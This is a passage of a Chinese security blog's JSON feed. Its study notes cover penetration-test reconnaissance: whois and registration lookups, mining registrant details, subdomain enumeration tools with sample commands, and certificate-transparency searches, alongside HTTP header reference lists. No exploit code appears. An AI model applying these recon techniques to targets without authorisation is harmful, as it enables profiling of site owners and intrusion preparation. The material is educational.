            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><p>知道目标域名之后，我们要做的第一件事情就是获取域名的注册信息，包括该域名的 DNS 服务器信息和注册人的联系信息等。</p><h2 id=\"whois-查询\"><a class=\"anchor\" href=\"#whois-查询\">#</a> whois 查询</h2><pre><code>Whois 是一个标准的互联网协议，可以用于收集网络注册信息，注册的域名、IP地址等信息。在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所属人往往就是管理员。kali中已经默认安装了whois。whois + 域名\n</code></pre><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FsaS5vcmcvZG93bmxvYWRzLw==\">Kali 下 whois 查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3dob2lzLmNoaW5hei5jb20v\">域名 Whois 查询 - 站长之家</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==\">Whois - 爱站</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=\">IP-38</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2hvaXMubmV0Lw==\">Whois Lookup</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb29rdXAuaWNhbm4ub3JnLw==\">ICANN Lookup</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS9kb21haW4/ZG9tYWluPQ==\">域名信息查询 - 腾讯云</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3dob2lzLnhpbm5ldC5jb20v\">新网 whois 信息查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9pcHdob2lzLw==\">IP WHOIS 查询 - 站长工具</span></li></ul><h2 id=\"备案信息查询\"><a class=\"anchor\" href=\"#备案信息查询\">#</a> 备案信息查询</h2><pre><code>网站备案是根据国家法律规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。\n</code></pre><ul><li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iZWlhbmJlaWFuLmNvbS8=\">ICP 备案查询网</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL2ljcC5jaGluYXouY29tLw==\">ICP 备案查询 - 站长工具</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWl6aGFuLmNvbS9zZW8v\">SEO 综合查询 - 爱站</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL2ljcC5jaGluYXouY29tL3NlYXJjaHM=\">批量查询 - 站长工具</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=\">工业和信息化部 ICP/IP/ 域名信息备案管理</span></li></ul><h2 id=\"企业信用信息查询\"><a class=\"anchor\" href=\"#企业信用信息查询\">#</a> 企业信用信息查询</h2><pre><code>企业信用指一家第三方征信机构通过征集另一家企业信息，根据征信机构的信用评级规则，评价出的企业信用等级。\n</code></pre><ul><li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s\">国家企业信用信息公示系统</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb21wYW55LnhpemhpLmNvbS8=\">悉知 - 全国企业信息查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3JlZGl0Y2hpbmEuZ292LmNuLw==\">信用中国 - 个人信用查询搜索 - 企业信息查询搜索</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v\">天眼查</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucWljaGFjaGEuY29tLw==\">企查查</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueGlhb2xhbmJlbi5jb20v\">小蓝本</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucWl4aW4uY29tLw==\">启信宝</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aW4uYmFpZHUuY29tLw==\">百度企业信用</span></li></ul><h2 id=\"浏览器插件\"><a class=\"anchor\" href=\"#浏览器插件\">#</a> 浏览器插件</h2><p>通过 Google、FireFox 等插件的使用，收集域名信息</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "信息收集",
                "信息收集"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "3. 子域名信息收集",
            "date_published": "2020-09-06T02:31:20.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"收集子域名信息\"><a class=\"anchor\" href=\"#收集子域名信息\">#</a> 收集子域名信息</h2><p>主域名是由两个或两个以上字母构成，中间由点号隔开，这个域名只有一个点号，子域名是顶级域名的下一级，域名整体包含两个 “.” 号。</p><p>子域名也就是二级域名，是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？常用的方法有以下这几种。</p><h3 id=\"常见子域名的收集方法\"><a class=\"anchor\" href=\"#常见子域名的收集方法\">#</a> 常见子域名的收集方法：</h3><p>（1） Web 子域名猜测与实际访问尝试<br>（2） 搜索引擎查询主域名地址<br>（3）查询 DNS 解析记录<br>（4） 基于 DNS 查询的暴力破解<br>（5）手工分析（查看主站页面及相关页面）</p><h3 id=\"在线平台查询\"><a class=\"anchor\" href=\"#在线平台查询\">#</a> 在线平台查询</h3><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=\">ip138</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zdWJkb21haW4vP2RvbWFpbj0v\">站长工具</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=\">hackertarget</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==\">t1h2ua</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v\">dnsdumpster</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kLmNoaW5hY3ljYy5jb20vaW5kZXgucGhwP209TG9naW4mYW1wO2E9aW5kZXg=\">chinacycc</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v\">dnsdumpster</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3ouemNqdW4uY29tLw==\">zcjun</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy55dW02LmNuL1Rvb2xzL3VybGJsYXN0Lw==\">tools.yum6.cn</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vc3ViZG9tYWluLw==\">tools.bugscaner</span></li></ul><h3 id=\"ip反查绑定域名网站\"><a class=\"anchor\" href=\"#ip反查绑定域名网站\">#</a> IP 反查绑定域名网站</h3><p>IP 关联域名，大部分网站一个 IP 多个域名</p><ul><li><span class=\"exturl\" data-url=\"aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWU/cw==\">站长之家</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=\">爱站</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=\">webscan</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy4xMTRiZXN0LmNvbS9pcC8=\">同 IP 网站查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXZlcnNlaXAuZG9tYWludG9vbHMuY29tLw==\">反向 IP 查询</span></li></ul><h3 id=\"资产搜索引擎\"><a class=\"anchor\" href=\"#资产搜索引擎\">#</a> 资产搜索引擎</h3><p>google、shodan、FOFA、zoomeye</p><h3 id=\"工具枚举\"><a class=\"anchor\" href=\"#工具枚举\">#</a> 工具枚举</h3><p>常用子域名工具如下（Github 上都可搜到）</p><ol><li>OneForAll<br>OneForAll 是一款功能强大的子域收集工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域 IP、子域常用端口、子域 Title、子域 Banner、子域状态等。</li></ol><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=\">项目地址</span><br>子域名收集： python3 <span class=\"exturl\" data-url=\"aHR0cDovL29uZWZvcmFsbC5weQ==\">oneforall.py</span> --target=<span class=\"exturl\" data-url=\"aHR0cDovL3RhcmdldC5jb20=\">target.com</span> run</p><ol start=\"2\"><li><p>Layer<br>Layer 子域名挖掘机的使用方法比较简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、开放端口、Web 服务器和网站状态等</p></li><li><p>subDomainsBrute<br>subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名。<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==\">项目地址</span><br>子域名收集：python <span class=\"exturl\" data-url=\"aHR0cDovL3N1YkRvbWFpbnNicnV0ZS5weQ==\">subDomainsbrute.py</span> <span class=\"exturl\" data-url=\"aHR0cDovL3h0YXJnZXQuY29t\">xtarget.com</span></p></li></ol><h3 id=\"证书透明度公开日志枚举\"><a class=\"anchor\" href=\"#证书透明度公开日志枚举\">#</a> 证书透明度公开日志枚举</h3><p>证书透明度 (Certificate Transparency, CT) 是证书授权机构 (CA) 的一个项目，证书授权机构会将每个 SSL/TLS 证书发布到公共日志中。一个 SSL/TLS 证书通常包含域名、子域名和邮件地址， 这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引 | 擎搜索一些公开的 CT 日志。</p><p>在线第三方平台查询</p><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcnQuc2gv\">crt.sh</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZW5zeXMuaW8v\">censys</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9teXNzbC5jb20v\">myssl</span></li></ul><h3 id=\"ns历史解析\"><a class=\"anchor\" href=\"#ns历史解析\">#</a> NS 历史解析</h3><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZG5zZGIuaW8v\">dnsdb</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWV3ZG5zLmluZm8v\">viewdns</span></li></ul><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "信息收集",
                "信息收集"
            ]
        },
        {
            "id": "http://avenue.cool/Linux/Linux/",
            "url": "http://avenue.cool/Linux/Linux/",
            "title": "Linuxdf",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><p>linux</p><!-- rebuild by hrmmi -->",
            "tags": [
                "Linux运维",
                "Linux运维"
            ]
        },
        {
            "id": "http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/",
            "url": "http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/",
            "title": "内网安全知识",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><p>内网安全知识</p><!-- rebuild by hrmmi -->",
            "tags": [
                "内网安全知识",
                "内网安全知识"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "1. 为什么要进行信息收集",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><p>在进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能的去搜集目标组织的信息。我们越是了解测试目标，测试的工作就越容易，在信息收集中，最重要的是收集服务器的配置信息和网站的敏感信息，其中包括域名和子域名信息，目标网站系统，CMS 指纹，目标网站真实 IP，开放的端口等，换句话说，只要是与目标网站相关的信息，我们都应该尽量收集。</p><p>&quot;只有不努力的黑客，没有攻不破的系统&quot;。<br>在 SRC 漏洞挖掘或渗透测试中，信息收集占很大一部分，能收集到别人收集不到的资产，就能挖到别人挖不到的洞。</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "信息收集",
                "信息收集"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/",
            "url": "http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/",
            "title": "3. WEB常见的HTTP响应头",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><ul><li><h2 id=\"1-响应报文格式\"><a class=\"anchor\" href=\"#1-响应报文格式\">#</a> （1）、响应报文格式：</h2></li></ul><p>&lt;version&gt;&lt;status&gt;&lt;reason-phrase&gt;<br>&lt;headers&gt;<br>&lt;entity-body&gt;</p><ul><li><h2 id=\"2-响应头报文\"><a class=\"anchor\" href=\"#2-响应头报文\">#</a> （2）、响应头报文：</h2></li></ul><p>Accept-Ranges<br>表明服务器是否支持指定范围请求及哪种类型的分段请求<br>Accept-Ranges: bytes</p><p>Access-Control-Allow-Origin<br>配置有权限访问资源的域<br>Access-Control-Allow-Origin: &lt;origin&gt;|*</p><p>Allow<br>对某网络资源的有效的请求行为，不允许则返回 405<br>Allow: GET, HEAD</p><p>Cache-Control<br>告诉所有的缓存机制是否可以缓存及哪种类型<br>Cache-Control: no-cache</p><p>Content-Encoding<br>web 服务器支持的返回内容压缩编码类型。<br>Content-Encoding: gzip</p><p>Content-Language<br>响应体的语言<br>Content-Language: en,zh</p><p>Content-Length<br>响应体的长度<br>Content-Length: 348</p><p>Content-Location<br>请求资源可替代的备用的另一地址<br>Content-Location: /index.htm</p><p>Content-Type<br>返回内容的 MIME 类型<br>Content-Type: text/html; charset=utf-8</p><p>Date<br>原始服务器消息发出的时间<br>Date: Tue, 15 Nov 2010 08:12:31 GMT</p><p>ETag<br>请求变量的实体标签的当前值<br>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>Location<br>用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源<br>Location: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==\">http://www.zcmhi.com/archives/94.html</span></p><p>Proxy-Authenticate<br>它指出认证方案和可应用到代理的该 URL 上的参数<br>Proxy-Authenticate: Basic</p><p>Refresh<br>应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）<br>Refresh: 5; url=http://www.zcmhi.com/archives/94.html</p><p>Server<br>web 服务器软件名称<br>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</p><p>Set-Cookie<br>设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</p><p>Strict-Transport-Security<br>设置浏览器强制使用 HTTPS 访问<br>max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求<br>includeSubDomains: 网站的子域名也启用规则<br>Strict-Transport-Security: max-age=1000; includeSubDomains</p><p>X-Frame-Options<br>配置页面是否能出现在 &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt; 等标签中，防止点击劫持<br>X-Frame-Options: deny<br>SAMEORGIN：仅同源域名下的页面匹配时许可</p><p>X-XSS-Protection<br>配置 XSS 防护机制<br>X-XSS-Protection: 1; mode=block</p><p>HttpOnly：使 JavaScript 脚本无法获取 cookie，防止 xss 攻击。</p><p>X-Powered-By：可以知道 web 后端语言（但是可以修改）</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/",
            "url": "http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/",
            "title": "2. 常见的HTTP请求头",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"常见的-http-请求头\"><a class=\"anchor\" href=\"#常见的-http-请求头\">#</a> 常见的 HTTP 请求头</h1><ul><li><h2 id=\"1-请求报文格式\"><a class=\"anchor\" href=\"#1-请求报文格式\">#</a> （1）、请求报文格式</h2></li></ul><p>&lt;method&gt;&lt;request-URL&gt;&lt;version&gt;<br>&lt;headers&gt;<br>&lt;entity-body&gt;</p><ul><li><h2 id=\"2请求方法\"><a class=\"anchor\" href=\"#2请求方法\">#</a> （2）请求方法：</h2></li></ul><p>GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。<br>POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。<br>HEAD：类似 GET 请求，但只获取头部信息，无响应体。<br>PUT：将传输数据取代指定文档传输。<br>DELETE：请求服务器删除指定页面。<br>CONNECT：与代理服务器可以进行管道方式连接。<br>OPTIONS：查询针对请求 URL 指定资源支持的方法。<br>TRACE：可以对请求消息的传输路径追踪。<br>MOVE：请求服务器将指定的页面移动到另一个网络地址上。</p><ul><li><h2 id=\"3请求头部常见的请求头\"><a class=\"anchor\" href=\"#3请求头部常见的请求头\">#</a> （3）请求头部：（常见的请求头）</h2></li></ul><p>Accept<br>指定客户端能够接收的内容类型<br>Accept: text/plain, text/html</p><p>Accept-Charset<br>浏览器可以接受的字符编码集<br>Accept-Charset: iso-8859-5</p><p>Accept-Encoding<br>指定浏览器可以支持的 web 服务器返回内容压缩编码类型<br>Accept-Encoding: compress, gzip</p><p>Accept-Language<br>浏览器可接受的语言<br>Accept-Language: en,zh</p><p>Authorization<br>HTTP 授权的授权证书<br>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</p><p>Cache-Control<br>指定请求和响应遵循的缓存机制 Cache-Control: no-cache</p><p>Connection<br>表示是否需要持久连接 // HTTP 1.1 默认进行持久连接<br>Connection: close</p><p>Cookie<br>HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器<br>Cookie: role=admin;ssid=1</p><p>Content-Length<br>请求的内容长度<br>Content-Length: 348</p><p>Content-Type<br>请求的与实体对应的 MIME 信息<br>Content-Type: application/x-www-form-urlencoded</p><p>Date<br>请求发送的日期和时间<br>Date: Tue, 15 Nov 2010 08:12:31 GMT</p><p>Host<br>指定请求的服务器的域名和端口号<br>Host: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5naXRodWIuY29t\">www.github.com</span></p><p>If-Match<br>只有请求内容与实体相匹配才有效<br>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>If-Modified-Since<br>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码 (比较资源更新的时间）<br>If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT</p><p>If-None-Match<br>如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变<br>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>If-Range<br>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag<br>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</p><p>Max-Forwards<br>限制信息通过代理和网关传送的时间<br>Max-Forwards: 10</p><p>Proxy-Authorization<br>连接到代理的授权证书<br>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</p><p>Range<br>只请求实体的一部分，指定范围<br>Range: bytes=500-999</p><p>Referer<br>先前网页的地址，当前请求网页紧随其后，即来路<br>Referer: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==\">http://www.zcmhi.com/archives/71.html</span></p><p>User-Agent<br>User-Agent 的内容包含发出请求的用户信息<br>User-Agent: Mozilla/5.0 (Linux; X11)</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        }
    ]
}